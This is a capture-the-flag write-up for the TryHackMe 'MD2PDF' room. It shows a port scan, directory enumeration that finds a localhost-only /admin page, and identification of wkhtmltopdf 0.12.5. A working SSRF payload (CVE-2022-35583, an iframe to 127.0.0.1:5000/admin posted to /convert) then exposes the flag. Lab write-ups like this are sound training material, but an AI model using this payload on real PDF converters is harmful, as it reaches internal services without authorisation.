# Target
| Category          | Details                                     |
|-------------------|---------------------------------------------|
| 📝 **Name**       | [MD2PDF](https://tryhackme.com/room/md2pdf) |  
| 🏷 **Type**       | THM Machine                                 |
| 🖥 **OS**         | Linux                                       |
| 🎯 **Difficulty** | Easy                                        |
| 📁 **Tags**       | wkhtmltopdf 0.12.5, SSRF                    |

# Scan
```
PORT     STATE SERVICE
22/tcp   open  ssh
| ssh-hostkey: 
|   3072 5c:e5:5e:42:5e:ec:a4:8d:93:b0:aa:9f:07:1e:d4:cd (RSA)
|   256 d9:9b:58:3f:31:79:0d:ac:c2:7a:de:7c:d0:01:ac:88 (ECDSA)
|_  256 2e:95:be:0d:ad:e9:53:2b:15:15:fa:8e:ab:37:1d:35 (ED25519)
80/tcp   open  http
|_http-title: MD2PDF
5000/tcp open  upnp
```

#### Enumerate target to discover `/admin`
```
┌──(magicrc㉿perun)-[~/attack/THM MD2PDF]
└─$ feroxbuster --url http://$TARGET:5000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
<SNIP>
403      GET        4l       18w      166c http://10.80.137.148:5000/admin
<SNIP>
```

#### Try to access `/admin`
```
┌──(magicrc㉿perun)-[~/attack/THM MD2PDF]
└─$ curl http://$TARGET:5000/admin                                                                                                                    
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>403 Forbidden</title>
<h1>Forbidden</h1>
<p>This page can only be seen internally (localhost:5000)</p>
```
Error message states that only internal (localhost) access is allowed.

#### Discover that `wkhtmltopdf 0.12.5` is being used to convert `.md` to `.pdf`
```
┌──(magicrc㉿perun)-[~/attack/THM MD2PDF]
└─$  curl -s http://$TARGET/convert -d 'md=test' -o test.pdf && pdfinfo test.pdf
Title:           
Creator:         wkhtmltopdf 0.12.5
Producer:        Qt 4.8.7
CreationDate:    Thu Nov 27 12:37:08 2025 CET
Custom Metadata: no
Metadata Stream: no
Tagged:          no
UserProperties:  no
Suspects:        no
Form:            none
JavaScript:      no
Pages:           1
Encrypted:       no
Page size:       595 x 842 pts (A4)
Page rot:        0
File size:       6281 bytes
Optimized:       no
PDF version:     1.4
```

#### Exploit [CVE-2022-35583](https://nvd.nist.gov/vuln/detail/CVE-2022-35583) to make `wkhtmltopdf` send internal request
```
┌──(magicrc㉿perun)-[~/attack/THM MD2PDF]
└─$ curl -s http://$TARGET/convert -d 'md=<iframe src="http://127.0.0.1:5000/admin" width="1000px" height="1000px">' -o out.pdf && pdftotext out.pdf -
flag{********************************}
```